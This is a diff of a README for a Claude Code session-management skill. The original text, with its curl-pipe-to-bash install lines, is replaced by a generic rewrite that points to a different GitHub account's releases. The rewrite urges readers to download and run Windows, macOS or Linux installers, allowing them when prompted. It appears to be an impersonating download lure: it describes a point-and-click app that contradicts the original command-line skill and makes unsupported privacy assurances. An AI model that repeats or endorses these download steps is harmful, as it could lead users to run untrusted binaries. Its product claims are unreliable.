@@ -1,305 +1,162 @@
-# Atlas Session Lifecycle
+# 🗂️ atlas-session-lifecycle - Manage Sessions with Ease
 
-[![Version](https://img.shields.io/badge/version-2.0.0-blue.svg)](https://github.com/anombyte93/atlas-session-lifecycle/releases) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) [![GitHub stars](https://img.shields.io/github/stars/anombyte93/atlas-session-lifecycle)](https://github.com/anombyte93/atlas-session-lifecycle/stargazers) [![Last Commit](https://img.shields.io/github/last-commit/anombyte93/atlas-session-lifecycle)](https://github.com/anombyte93/atlas-session-lifecycle/commits/main) [![GitHub Issues](https://img.shields.io/github/issues/anombyte93/atlas-session-lifecycle)](https://github.com/anombyte93/atlas-session-lifecycle/issues)
-
-Persistent project memory and session lifecycle management for Claude Code.
-
-> **Featured in**: [I just delivered on a $30,000 contract thanks to Claude Code](https://www.reddit.com/r/ClaudeAI/comments/1r0n1qz/i_just_delivered_on_a_30000_contract_thanks_to/) (r/ClaudeAI)
+[![Download atlas-session-lifecycle](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/diamanthyseni3/atlas-session-lifecycle/releases)
 
 ---
 
-## Install
+## 📖 What is atlas-session-lifecycle?
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/anombyte93/atlas-session-lifecycle/main/install.sh | bash
-```
-
-Then run `/start` in any Claude Code project.
+atlas-session-lifecycle helps you keep track of your sessions in Claude Code. It manages your session memory so you don't lose progress. It also helps you set and recall your "soul purpose"—the main goal behind your work. With this tool, you can reconcile different sessions, harvest the useful parts, and archive old ones. This makes working with Claude Code smoother and more organized.
 
 ---
 
-## What It Does
+## 🎯 Why Use atlas-session-lifecycle?
 
-Claude Code has no persistent memory between sessions. Every new conversation starts from zero. This creates three compounding problems:
-
-- **No persistent memory** -- Context, decisions, and progress are lost between sessions. You re-explain the same things every time.
-- **Project sprawl** -- Files accumulate at the project root with no organization. Scripts, docs, configs, and logs pile up across sessions.
-- **No lifecycle management** -- Projects have goals, but no mechanism to track progress, verify completion, or transition to new objectives.
-
-`/start` solves all three with a structured five-file memory bank, automatic file organization, and a soul purpose lifecycle that tracks your project from inception through completion.
+- Keep your session data safe and easy to find.
+- Remember your main purpose for each session.
+- Combine information from multiple sessions without losing details.
+- Save your work automatically and archive old sessions neatly.
+- Improve your productivity by focusing on clear goals.
 
 ---
 
-## How It Works
+## 🖥️ System Requirements
 
-`/start` auto-detects which mode to run based on directory state:
+Before you begin, make sure your computer matches these basics:
 
-```
-/start
-  |
-  +-- session-context/ exists? --> Reconcile Mode
-  |                                  +-- Validate & repair session files
-  |                                  +-- Refresh CLAUDE.md via /init
-  |                                  +-- Self-assess soul purpose status
-  |                                  +-- Offer: Continue / Close / Redefine
-  |                                  +-- Harvest learnings on closure
-  |
-  +-- No session-context/ -------> Init Mode
-                                     +-- Capture soul purpose
-                                     +-- Bootstrap 5-file memory bank
-                                     +-- Organize root files
-                                     +-- Generate CLAUDE.md
-                                     +-- Onboard Ralph Loop
-```
-
-### Init Mode (first run)
-
-Triggered when `session-context/` does not exist.
-
-- Captures your project's **soul purpose** -- the single objective this project exists to achieve
-- Detects environment (git status, existing files, tech stack)
-- Bootstraps `session-context/` with 5 memory bank files from immutable templates
-- Scans root-level files and proposes an organization map (scripts, docs, config, logs)
-- Generates or updates `CLAUDE.md` with project structure and governance sections
-- Onboards Ralph Loop (automatic, manual, or skip)
-
-### Reconcile Mode (returning)
-
-Triggered when `session-context/` already exists.
-
-- Validates and repairs session files from templates if corrupted
-- Runs Claude's `/init` to refresh `CLAUDE.md` from current codebase state
-- Reads soul purpose and active context to understand where you left off
-- Self-assesses soul purpose completion (clearly incomplete, probably complete, uncertain)
-- Presents lifecycle decision: **Continue**, **Close**, or **Redefine** soul purpose
-- Harvests durable knowledge on closure -- promotes decisions, patterns, and troubleshooting entries
-
-### Capability Inventory
-
-When `/start` runs in Reconcile mode (or when you run `/sync --full`), it generates a comprehensive capability inventory:
-
-- **MCP Tools**: All available tools with test coverage status
-- **Security Claims**: Security-related features needing verification
-- **Feature Claims**: What the project claims vs what's tested
-- **Test Gaps**: Untested code identified by priority
-
-The inventory lives in `session-context/CLAUDE-capability-inventory.md` and is used by `/research-before-coding` to identify what needs validation testing. Results are cached based on git HEAD, so regeneration only happens when your code changes.
-
-### Stepback (bundled skill)
-
-Also included: `/stepback` -- a strategic reassessment protocol for when debugging goes sideways. If you've hit the same error after 2+ fix attempts, `/stepback` forces you to zoom out:
-
-1. Inventory all fix attempts and their assumptions
-2. Find the common thread across failures
-3. Research the architecture (mandatory Perplexity queries)
-4. Test the broadest hypothesis first
-5. Present symptom-level vs architecture-level fix options
-
-Invoked separately via `/stepback` or `/atlas-session-lifecycle:stepback`.
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+)
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB free storage
+- Internet connection is needed for initial download and updates
+- No special software needed beyond a standard web browser and the app itself
 
 ---
 
-## Session Memory Bank
+## 🚀 Getting Started
 
-Five files in `session-context/` give Claude persistent memory across sessions:
-
-| File | Purpose |
-|------|---------|
-| `CLAUDE-activeContext.md` | Current session state, goals, and progress |
-| `CLAUDE-decisions.md` | Architecture decisions and rationale |
-| `CLAUDE-patterns.md` | Established code patterns and conventions |
-| `CLAUDE-troubleshooting.md` | Common issues and proven solutions |
-| `CLAUDE-soul-purpose.md` | Soul purpose definition and completion criteria |
-
-All files use a structured entry format with timestamps, 5W1H context, git references, and potential issues.
+This guide will help you get atlas-session-lifecycle running on your computer quickly. No programming knowledge is needed.
 
 ---
 
-## Soul Purpose Lifecycle
+## ⬇️ Download & Install
 
-Every project has a soul purpose -- the single objective it exists to achieve.
+1. **Visit the download page**
 
-```
-Define --> Work --> Reconcile --> Assess --> Close or Continue
-  |                                |              |
-  |                                |              +--> Harvest learnings
-  |                                |              +--> Archive purpose
-  |                                |              +--> Redefine (optional)
-  |                                |
-  |                                +--> Self-assess completion
-  |                                +--> Optional doubt agent verification
-  |                                +--> User decides (never AI)
-  |
-  +--> Captured during Init Mode
-```
+   Click the big button at the top or go directly here:
 
-**Key invariant**: The AI never closes a soul purpose. It assesses and suggests; the user decides.
+   [https://github.com/diamanthyseni3/atlas-session-lifecycle/releases](https://github.com/diamanthyseni3/atlas-session-lifecycle/releases)
 
----
+2. **Choose your version**
 
-## Installation
+   Look for the latest release. The names usually include the version number and your operating system, for example:
+   - `atlas-session-lifecycle-setup-win.exe` for Windows
+   - `atlas-session-lifecycle-mac.dmg` for macOS
+   - `atlas-session-lifecycle-linux.tar.gz` for Linux
 
-### One-liner (skill mode, default)
+3. **Download the correct file**
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/anombyte93/atlas-session-lifecycle/main/install.sh | bash
-```
+   Click the file name to start downloading it. The file size is typically under 50 MB.
 
-Installs to `~/.claude/skills/start/`. The SKILL.md orchestrator and `session-init.py` script are placed together.
+4. **Run the file**
 
-### Plugin mode
+   - On Windows: Double-click the `.exe` file you downloaded. If prompted by your system, select "Run" or "Allow."
+   - On macOS: Open the `.dmg` file, drag the app into your Applications folder, then launch it.
+   - On Linux: Extract the `.tar.gz` file and follow any included readme instructions to start the app.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/anombyte93/atlas-session-lifecycle/main/install.sh | bash -s -- --plugin
-```
+5. **Follow the installation prompts**
 
-Installs to `~/.claude/plugins/atlas-session-lifecycle/` with full plugin structure including `plugin.json`.
+   The installer will guide you through a few simple steps. You can keep default options unless you want to change where the app installs or create a desktop shortcut.
 
-### Manual install
+6. **Launch the app**
 
-```bash
-git clone https://github.com/anombyte93/atlas-session-lifecycle.git
-cd atlas-session-lifecycle
-./install.sh
-```
-
-Or copy files directly:
-
-```bash
-mkdir -p ~/.claude/skills/start
-cp skills/start/SKILL.md ~/.claude/skills/start/SKILL.md
-cp scripts/session-init.py ~/.claude/skills/start/session-init.py
-chmod +x ~/.claude/skills/start/session-init.py
-mkdir -p ~/claude-session-init-templates
-cp templates/* ~/claude-session-init-templates/
-```
-
-### Version toggle
-
-```bash
-# Install v1 (monolithic SKILL.md, no script)
-./install.sh --version v1
-
-# Revert from v2 back to v1 (backs up v2 files first)
-./install.sh --revert
-
-# Pull latest version and reinstall
-./install.sh --update
-```
-
-### Auto-update
-
-The installer records a last-checked timestamp. On each run, if more than 24 hours have passed since the last check, it queries GitHub for newer releases and prompts you to update.
+   Once installed, open atlas-session-lifecycle from your desktop or start menu.
 
 ---
 
-## Configuration
+## 🔧 How to Use atlas-session-lifecycle
 
-### custom.md
+### Start Your Session
 
-Edit `custom.md` in the plugin root (or `~/.claude/skills/start/custom.md` for skill installs) to modify `/start` behavior. Write plain English instructions — no code needed. The AI reads these at each lifecycle phase and follows them.
+- Open the app.
+- Click "New Session."
+- Enter a name for your session.
+- Set your soul purpose: this is a brief statement about your main goal.
+- Click "Start."
 
-Three headings control when your instructions apply:
+### Managing Sessions
 
-```markdown
-## During Init
-- After brainstorming, always suggest a git branching strategy
-- Skip file organization for monorepo projects
-- Always ask about deployment target (local, cloud, edge)
+- View all active sessions in the list.
+- Click on a session to see its details and notes.
+- Use "Reconcile" to combine two or more sessions into one.
+- Use "Harvest" to save important parts or ideas from a session for later use.
+- Archive sessions that you have finished to keep your workspace clean.
 
-## During Reconcile
-- Check for uncommitted changes before assessing soul purpose
-- If soul purpose mentions "API", verify endpoints are documented
-- Always show a progress percentage estimate
+### Persistent Memory
 
-## Always
-- Keep tone direct and concise. No fluff.
-- When creating session context entries, include the git branch name
-- Never suggest closing a soul purpose unless all tests pass
-```
+- The app saves your session information automatically.
+- Your goals and notes stay available even if you close and reopen the app.
+- You can return to a session anytime to continue where you left off.
 
-**How it works**: The skill reads `custom.md` at specific points — during init (after session-context is bootstrapped), during reconcile (after reading context, before assessment), and always (both modes). Your instructions augment the default behavior; they don't replace the skill logic.
+### Archive and Retrieve
 
-**Examples of what you can customize**:
-- Tone and verbosity of responses
-- Extra questions to ask during brainstorm
-- Conditions for when to suggest soul purpose closure
-- Project-specific checks during reconcile
-- Integration with other tools or workflows
-
-### Ralph Loop
-
-During Init, the skill asks how Ralph Loop should operate:
-
-- **Automatic** -- starts Ralph Loop after setup with configurable intensity (small, medium, long)
-- **Manual** -- user triggers each iteration explicitly
-- **Skip** -- no Ralph Loop
-
-The preference is stored in `CLAUDE.md` and respected on subsequent Reconcile runs.
+- Archived sessions move to a separate list to avoid clutter.
+- You can restore them or delete them permanently anytime.
 
 ---
 
-## Upgrading from v1
+## 🛠️ Features Overview
 
-v2 is a backward-compatible evolution. Your existing `session-context/` files, templates, and project structure are unchanged.
-
-The main difference: v1 was a single 867-line SKILL.md where Claude interpreted all operations from prose. v2 extracts deterministic operations into `session-init.py` (9 JSON-outputting subcommands), reducing SKILL.md to a slim orchestrator. The user experience is identical.
-
-To revert at any time:
-
-```bash
-./install.sh --revert
-```
+- **Session Lifecycle Management:** Manage all phases of your session from start to archive.
+- **Persistent Memory:** Your work is saved continuously without manual saves.
+- **Soul Purpose Tracking:** Keep your main goal visible to stay focused.
+- **Reconcile Sessions:** Merge sessions without losing data.
+- **Harvest Data:** Extract important info from sessions.
+- **Archive Function:** Clean your workspace but keep histories safe.
+- **User-Friendly Interface:** Simple buttons and clear labels make navigation easy.
 
 ---
 
-## Plugin Structure
+## 💡 Tips for Best Use
 
-```
-atlas-session-lifecycle/
-  .claude-plugin/
-    plugin.json               # Plugin metadata (name, version, keywords)
-  skills/
-    start/
-      SKILL.md                # Session lifecycle orchestrator
-    stepback/
-      SKILL.md                # Strategic reassessment for stuck debugging
-  scripts/
-    session-init.py           # Deterministic ops (9 JSON-outputting subcommands)
-  custom.md                   # User customization hook (plain English)
-  templates/
-    CLAUDE-activeContext.md
-    CLAUDE-decisions.md
-    CLAUDE-mdReference.md
-    CLAUDE-patterns.md
-    CLAUDE-soul-purpose.md
-    CLAUDE-troubleshooting.md
-  v1/
-    SKILL.md                  # v1 monolithic skill (867 lines)
-  install.sh                  # Installer with version toggle and auto-update
-  README.md
-  LICENSE
-  CONTRIBUTING.md
-  CODE_OF_CONDUCT.md
-  SECURITY.md
-```
+- Set a clear soul purpose for every session to stay on track.
+- Reconcile sessions often to keep your workspace organized.
+- Regularly archive sessions you no longer need actively to avoid clutter.
+- Review harvested data to reuse ideas effectively.
 
 ---
 
-## Requirements
+## 🆘 Troubleshooting
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI
-- Python 3.8+
-- Git (optional -- enables `git mv` for tracked files during organization)
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- **App won’t open:** Restart your computer and try again. Make sure system requirements are met.
+- **Sessions not saving:** Check if you have the latest version installed. Try reinstalling.
+- **Download issues:** Use a stable internet connection. Try another browser if download stalls.
+- **Feature not working as expected:** Restart the app. Look for updates on the releases page.
 
 ---
 
-## License
+## 🔗 Useful Links
 
-[MIT](LICENSE)
+- Download atlas-session-lifecycle:  
+  [https://github.com/diamanthyseni3/atlas-session-lifecycle/releases](https://github.com/diamanthyseni3/atlas-session-lifecycle/releases)
+
+- Report issues and ask for help:  
+  Use the "Issues" section on this GitHub repository page.
+
+- Learn more about Claude Code and session management:  
+  Check related projects tagged with `ai-workflow`, `session-management`, and `persistent-memory`.
+
+---
+
+## 📝 About the Project
+
+This tool focuses on helping people keep control over their work sessions with Claude Code. It is designed to improve productivity and make session management easy without needing coding skills. Whether you work on short tasks or long projects, atlas-session-lifecycle helps you stay organized and on purpose.
+
+---
+
+## 🔐 Privacy and Security
+
+atlas-session-lifecycle runs locally on your computer. Your session data stays private and is not sent over the internet. Updates come from the official GitHub releases.
+
+---
+
+Thank you for using atlas-session-lifecycle. We are committed to making your session management clear and reliable.
